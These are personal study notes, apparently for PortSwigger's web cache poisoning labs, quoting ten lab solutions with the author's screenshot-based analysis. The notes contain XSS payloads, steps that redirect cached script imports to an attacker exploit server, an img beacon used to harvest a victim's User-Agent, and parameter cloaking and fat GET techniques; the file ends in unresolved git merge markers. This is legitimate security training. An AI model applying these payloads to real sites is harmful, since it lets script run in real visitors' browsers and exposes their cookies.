https://portswigger.net/web-security/web-cache-poisoning#what-is-web-cache-poisoning
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws

#### Param Miner
You can automate the process of identifying unkeyed inputs by adding the [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) extension to Burp from the BApp store. To use Param Miner, you simply right-click on a request that you want to investigate and click "Guess headers". Param Miner then runs in the background, sending requests containing different inputs from its extensive, built-in list of headers. If a request containing one of its injected inputs has an effect on the response, Param Miner logs this in Burp, either in the "Issues" pane if you are using Burp Suite Professional, or in the "Output" tab of the extension ("Extensions" > "Installed" > "Param Miner" > "Output") if you are using Burp Suite Community Edition.

For example, in the following screenshot, Param Miner found an unkeyed header `X-Forwarded-Host` on the home page of the website:

![](Pasted%20image%2020241103040921.png)

**Caution:** When testing for unkeyed inputs on a live website, there is a risk of inadvertently causing the cache to serve your generated responses to real users. Therefore, it is important to make sure that your requests all have a unique cache key so that they will only be served to you. To do this, you can manually add a cache buster (such as a unique parameter) to the request line each time you make a request. Alternatively, if you are using Param Miner, there are options for automatically adding a cache buster to every request.


# 1.  Web cache poisoning with an unkeyed header
This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

1. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the `GET` request for the home page and send it to Burp Repeater.
2. Add a cache-buster query parameter, such as `?cb=1234`.
3. Add the `X-Forwarded-Host` header with an arbitrary hostname, such as `example.com`, and send the request.
4. Observe that the `X-Forwarded-Host` header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at `/resources/js/tracking.js`.
5. Replay the request and observe that the response contains the header `X-Cache: hit`. This tells us that the response came from the cache.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:
    `/resources/js/tracking.js`
7. In the body, enter the payload `alert(document.cookie)` and store the exploit.
8. Open the `GET` request for the home page in Burp Repeater and remove the cache buster.
9. Add the following header, remembering to enter your own exploit server ID:
    `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
10. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and `X-Cache: hit` in the headers.
11. To simulate the victim, load the poisoned URL in the browser and make sure that the `alert()` is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
12. If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.

Analysis:
![](Pasted%20image%2020241103052909.png)

![](Pasted%20image%2020241103053102.png)

store the exploit on a server and deliver trough X-Forward-Host header:
![](Pasted%20image%2020241103053433.png)

![](Pasted%20image%2020241103053657.png)

send the request until the payload is finally cached by the server ( hit )


# 2.Web cache poisoning with an unkeyed cookie
This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(1)` in the visitor's browser.

1. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that the first response you received sets the cookie `fehost=prod-cache-01`.
2. Reload the home page and observe that the value from the `fehost` cookie is reflected inside a double-quoted JavaScript object in the response.
3. Send this request to Burp Repeater and add a cache-buster query parameter.
4. Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.
5. Place a suitable XSS payload in the `fehost` cookie, for example:
    `fehost=someString"-alert(1)-"someString`
6. Replay the request until you see the payload in the response and `X-Cache: hit` in the headers.
7. Load the URL in the browser and confirm the `alert()` fires.
8. Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.

Analysis:

- cookie `fehost=prod-cache-01`.![](Pasted%20image%2020241104012549.png)
  - value of the `fehost` is now reflected in  response![](Pasted%20image%2020241104013750.png)
  - testing for reflection ![](Pasted%20image%2020241104013931.png)
  ![](Pasted%20image%2020241104014131.png)

# 3.  Web cache poisoning with multiple headers
This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

1. Go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the `GET` request for the JavaScript file `/resources/js/tracking.js` and send it to Burp Repeater.
2. Add a cache-buster query parameter and the `X-Forwarded-Host` header with an arbitrary hostname, such as `example.com`. Notice that this doesn't seem to have any effect on the response.
3. Remove the `X-Forwarded-Host` header and add the `X-Forwarded-Scheme` header instead. Notice that if you include any value other than `HTTPS`, you receive a 302 response. The `Location` header shows that you are being redirected to the same URL that you requested, but using `https://`.
4. Add the `X-Forwarded-Host: example.com` header back to the request, but keep `X-Forwarded-Scheme: nothttps` as well. Send this request and notice that the `Location` header of the 302 redirect now points to `https://example.com/`.
5. Go to the exploit server and change the file name to match the path used by the vulnerable response:
    `/resources/js/tracking.js`
6. In the body, enter the payload `alert(document.cookie)` and store the exploit.
7. Go back to the request in Burp Repeater and set the `X-Forwarded-Host` header as follows, remembering to enter your own exploit server ID:
    `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
8. Make sure the `X-Forwarded-Scheme` header is set to anything other than `HTTPS`.
9. Send the request until you see your exploit server URL reflected in the response and `X-Cache: hit` in the headers.
10. To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in Burp's browser. If the cache was successfully poisoned, you will see the script containing your payload, `alert(document.cookie)`. Note that the `alert()` won't actually execute here.
11. Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again.
12. To simulate the victim, reload the home page in the browser and make sure that the `alert()` fires.
13. Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved.

- adding a cachebuster param
	![](Pasted%20image%2020241104021240.png)
- quick headers scan using Param Miner burp extension and we observe that `X-Forwarded-Scheme` header is unkeyed
	![](Pasted%20image%2020241104021527.png)
- https scheme --> 200 response (no backserver redirect) so we have to use a nonhttps scheme
	![](Pasted%20image%2020241104022652.png)

	![](Pasted%20image%2020241104022736.png)
- scanning again using Param Miner
	![](Pasted%20image%2020241104022921.png)![](Pasted%20image%2020241104023250.png)![](Pasted%20image%2020241104023333.png)
- craft the exploit using our exploiting server as forwarded host with the poisoned cache
	![](Pasted%20image%2020241104023529.png)

# 4.Targeted web cache poisoning using an unknown header
This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

1. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the `GET` request for the home page.
2. With the [Param Miner](https://portswigger.net/web-security/web-cache-poisoning#param-miner) extension enabled, right-click on the request and select "Guess headers". After a while, Param Miner will report that there is a secret input in the form of the `X-Host` header.
3. Send the `GET` request to Burp Repeater and add a cache-buster query parameter.
4. Add the `X-Host` header with an arbitrary hostname, such as `example.com`. Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at `/resources/js/tracking.js`.
5. Go to the exploit server and change the file name to match the path used by the vulnerable response:
    `/resources/js/tracking.js`
6. In the body, enter the payload `alert(document.cookie)` and store the exploit.
7. Go back to the request in Burp Repeater and set the `X-Host` header as follows, remembering to add your own exploit server ID:
    `X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
8. Send the request until you see your exploit server URL reflected in the response and `X-Cache: hit` in the headers.
9. To simulate the victim, load the URL in the browser and make sure that the `alert()` fires.
10. Notice that the `Vary` header is used to specify that the `User-Agent` is part of the cache key. To target the victim, you need to find out their `User-Agent`.
11. On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example:
    `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />`
12. Go to the blog page and double-check that your comment was successfully posted.
13. Go to the exploit server and click the button to open the "Access log". Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their `User-Agent` from the log.
14. Go back to your malicious request in Burp Repeater and paste the victim's `User-Agent` into the corresponding header. Remove the cache buster.
15. Keep sending the request until you see your exploit server URL reflected in the response and `X-Cache: hit` in the headers.
16. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved

Analysis:
![](Pasted%20image%2020241105121620.png)

![](Pasted%20image%2020241105121805.png)

![](Pasted%20image%2020241105121922.png)

![](Pasted%20image%2020241105122353.png)

![](Pasted%20image%2020241105122855.png)

# 5. Web cache poisoning via an unkeyed query parameter
This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome. To solve the lab, poison the home page with a response that executes `alert(1)` in the victim's browser.

1. Observe that the home page is a suitable cache oracle. Notice that you get a cache miss whenever you change the query string. This indicates that it is part of the cache key. Also notice that the query string is reflected in the response.
2. Add a cache-buster query parameter.
3. Use Param Miner's "Guess GET parameters" feature to identify that the parameter `utm_content` is supported by the application.
4. Confirm that this parameter is unkeyed by adding it to the query string and checking that you still get a cache hit. Keep sending the request until you get a cache miss. Observe that this unkeyed parameter is also reflected in the response along with the rest of the query string.
5. Send a request with a `utm_content` parameter that breaks out of the reflected string and injects an XSS payload:
    `GET /?utm_content='/><script>alert(1)</script>`
6. Once your payload is cached, remove the `utm_content` parameter, right-click on the request, and select "Copy URL". Open this URL in the browser and check that the `alert()` is triggered when you load the page.
7. Remove your cache buster, re-add the `utm_content` parameter with your payload, and replay the request until the cache is poisoned for normal users. The lab will be solved when the victim user visits the poisoned home page.


# 6. Web cache poisoning via an unkeyed query string
This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome. To solve the lab, poison the home page with a response that executes `alert(1)` in the victim's browser.

1. With Burp running, load the website's home page. In Burp, go to "Proxy" > "HTTP history". Find the `GET` request for the home page. Notice that this page is a potential cache oracle. Send the request to Burp Repeater.
2. Add arbitrary query parameters to the request. Observe that you can still get a cache hit even if you change the query parameters. This indicates that they are not included in the cache key.
3. Notice that you can use the `Origin` header as a cache buster. Add it to your request.
4. When you get a cache miss, notice that your injected parameters are reflected in the response. If the response to your request is cached, you can remove the query parameters and they will still be reflected in the cached response.
5. Add an arbitrary parameter that breaks out of the reflected string and injects an XSS payload:
    `GET /?evil='/><script>alert(1)</script>`
6. Keep replaying the request until you see your payload reflected in the response and `X-Cache: hit` in the headers.
7. To simulate the victim, remove the query string from your request and send it again (while using the same cache buster). Check that you still receive the cached response containing your payload.
8. Remove the cache-buster `Origin` header and add your payload back to the query string. Replay the request until you have poisoned the cache for normal users. Confirm this attack has been successful by loading the home page in the browser and observing the popup.

Analysis:
![](Pasted%20image%2020241108024948.png)

- we need to change the position of the cache buster thus we will inject our payload in the GET request in order to be reflected as a string in the response
- we will use `Origin` header for cb 
	![](Pasted%20image%2020241108025301.png)
# 7. Parameter cloaking
This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome. To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes `alert(1)` in the victim's browser.

1. Identify that the `utm_content` parameter is supported. Observe that it is also excluded from the cache key.
2. Notice that if you use a semicolon (`;`) to append another parameter to `utm_content`, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
3. Observe that every page imports the script `/js/geolocate.js`, executing the callback function `setCountryCookie()`. Send the request `GET /js/geolocate.js?callback=setCountryCookie` to Burp Repeater.
4. Notice that you can control the name of the function that is called on the returned data by editing the `callback` parameter. However, you can't poison the cache for other users in this way because the parameter is keyed.
5. Study the cache behavior. Observe that if you add duplicate `callback` parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second `callback` parameter to the `utm_content` parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:
    `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction HTTP/1.1 200 OK X-Cache-Key: /js/geolocate.js?callback=setCountryCookie … arbitraryFunction({"country" : "United Kingdom"})`
6. Send the request again, but this time pass in `alert(1)` as the callback function:
    `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
7. Get the response cached, then load the home page in the browser. Check that the `alert()` is triggered.
8. Replay the request to keep the cache poisoned. The lab will solve when the victim user visits any page containing this resource import URL.

Analysis:
- Identify a cache oracle
  ![](Pasted%20image%2020241108025559.png)
- Adding a cache buster using `Origin` header
	![](Pasted%20image%2020241108025739.png)
- Observe where the payload is reflected and in this case thus callback parameter is keyed we will obtain only an XSS so we need to trick the back end server
  ![](Pasted%20image%2020241108025843.png)
- Using Param Miner we discover an unkeyed param that we can make us of `utm_content`
	![](Pasted%20image%2020241108030149.png)
- we need to convert & in ; in order to trick the server that our payload is part of the unkeyed parameter and will be treated in the same way
  ![](Pasted%20image%2020241108030427.png)![](Pasted%20image%2020241108030506.png)![](Pasted%20image%2020241108030532.png)
# 8. Web cache poisoning via a fat GET request
This lab is vulnerable to web cache poisoning. It accepts `GET` requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome. To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.

1. Observe that every page imports the script `/js/geolocate.js`, executing the callback function `setCountryCookie()`. Send the request `GET /js/geolocate.js?callback=setCountryCookie` to Burp Repeater.
2. Notice that you can control the name of the function that is called in the response by passing in a duplicate `callback` parameter via the request body. Also notice that the cache key is still derived from the original `callback` parameter in the request line:
    `GET /js/geolocate.js?callback=setCountryCookie … callback=arbitraryFunction HTTP/1.1 200 OK X-Cache-Key: /js/geolocate.js?callback=setCountryCookie … arbitraryFunction({"country" : "United Kingdom"})`
3. Send the request again, but this time pass in `alert(1)` as the callback function. Check that you can successfully poison the cache.
4. Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL.

Analysis:

- identify cache oracle
	![](Pasted%20image%2020241108181309.png)
- adding a cache buster using `Origin` header
	![](Pasted%20image%2020241108181427.png)
- see where payload is reflected in the response (parameter pollution)
	![](Pasted%20image%2020241108181728.png)
- using PARAM MINER we observe that no unkeyed parameter is identified --> we will use a fat get request by passing in a duplicate `callback` parameter via the request body
	![](Pasted%20image%2020241108182014.png)
	![](Pasted%20image%2020241108182411.png)

# 9. URL normalization
This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding. To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute `alert(1)` in the victim's browser. Then, deliver the malicious URL to the victim.

1. In Burp Repeater, browse to any non-existent path, such as `GET /random`. Notice that the path you requested is reflected in the error message.
2. Add a suitable reflected XSS payload to the request line:
    `GET /random</p><script>alert(1)</script><p>foo`
3. Notice that if you request this URL in the browser, the payload doesn't execute because it is URL-encoded.
4. In Burp Repeater, poison the cache with your payload and then immediately load the URL in the browser. This time, the `alert()` is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.
5. Re-poison the cache then immediately go to the lab and click "Deliver link to victim". Submit your malicious URL. The lab will be solved when the victim visits the link.

Analysis:
- adding a cache buster 
	![](Pasted%20image%2020241108185018.png)
- searching for unkeyed inputs using PARAM MINER -->
	![](Pasted%20image%2020241108185130.png)
- if no unkeyed value were found we will go next for a NORMALIZATION BEHAVIOR by the cache 
- we will encode / in the request and we observe a 404 not found (this type of error is coming from backend server)
	![](Pasted%20image%2020241108185933.png)
	- keep in mind that the front end server will treat the `/` and `%2f`(encoded version of it) in the same way so in this way, front page being defaced, we can inject our payload and store it in the cache
	![](Pasted%20image%2020241108190035.png)![](Pasted%20image%2020241108190338.png)![](Pasted%20image%2020241108190443.png)


# 10. Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely. To solve the lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

1. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the `GET` request for the home page and send it to Burp Repeater.
2. Use [Param Miner](https://portswigger.net/web-security/web-cache-poisoning#param-miner) to identify that the `X-Forwarded-Host` header is supported.
3. Add a cache buster to the request, as well as the `X-Forwarded-Host` header with an arbitrary hostname, such as `example.com`. Notice that this header overwrites the `data.host` variable, which is passed into the `initGeoLocate()` function.
4. Study the `initGeoLocate()` function in `/resources/js/geolocate.js` and notice that it is vulnerable to [DOM-XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) due to the way it handles the incoming JSON data.
5. Go to the exploit server and change the file name to match the path used by the vulnerable response:
    `/resources/json/geolocate.json`
6. In the head, add the header `Access-Control-Allow-Origin: *` to enable [CORS](https://portswigger.net/web-security/cors/access-control-allow-origin)
7. In the body, add a malicious JSON object that matches the one used by the vulnerable website. However, replace the value with a suitable XSS payload, for example:
    `{ "country": "<img src=1 onerror=alert(document.cookie) />" }`
8. Store the exploit.
9. Back in Burp, find the request for the home page and send it to Burp Repeater.
10. In Burp Repeater, add the following header, remembering to enter your own exploit server ID:
    `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
11. Send the request until you see your exploit server URL reflected in the response and `X-Cache: hit` in the headers.
12. If this doesn't work, notice that the response contains the `Set-Cookie` header. Responses containing this header are not cacheable on this site. Reload the home page to generate a new request, which should have a session cookie already set.
13. Send this new request to Burp Repeater and repeat the steps above until you successfully poison the cache.
14. To simulate the victim, load the URL in the browser and make sure that the `alert()` fires.

Analysis:
- move set cookie in the request part ( no need for backend to store it) in order to obtain a cacheability valid criteria
![](Pasted%20image%2020241108215504.png)

- identify a cache oracle
  ![](Pasted%20image%2020241108215653.png)
  - adding a cache buster
    ![](Pasted%20image%2020241108215820.png)
- using PARAM MINER in order to discover an unkeyed parameter
	![](Pasted%20image%2020241108215953.png)
- X-Forwarded-Host header value is reflected in the response
  ![](Pasted%20image%2020241108220104.png)
  - also pay attention where this is stored/reflected in the dom (trough a dictionary named data)
	![](Pasted%20image%2020241108220306.png)
- quick search after the data dictonary in the same response will lead us to this:
  ![](Pasted%20image%2020241108220447.png)
- following up the path will lead us to this:
  ![](Pasted%20image%2020241108220630.png)
  ![](Pasted%20image%2020241108220800.png)
 - at line 21 it is used `.innerHTML` which is dangerous thus it represents a sink and we could inject our js payload over there
   ![](Pasted%20image%2020241108220947.png)
   Exploit:![](Pasted%20image%2020241108221240.png)
   ![](Pasted%20image%2020241108221345.png)
   - sending the request we obtain a CORS error:
    ![](Pasted%20image%2020241108221506.png)![](Pasted%20image%2020241108221539.png)
- RELAX THE SAME-ORIGIN policy by adding in our exploit server request `Access-Control-Allow-Origin: *`
	![](Pasted%20image%2020241108221657.png)
<<<<<<< Updated upstream
	![](Pasted%20image%2020241108221839.png)

# 11.
=======
	![](Pasted%20image%2020241108221839.png)
>>>>>>> Stashed changes
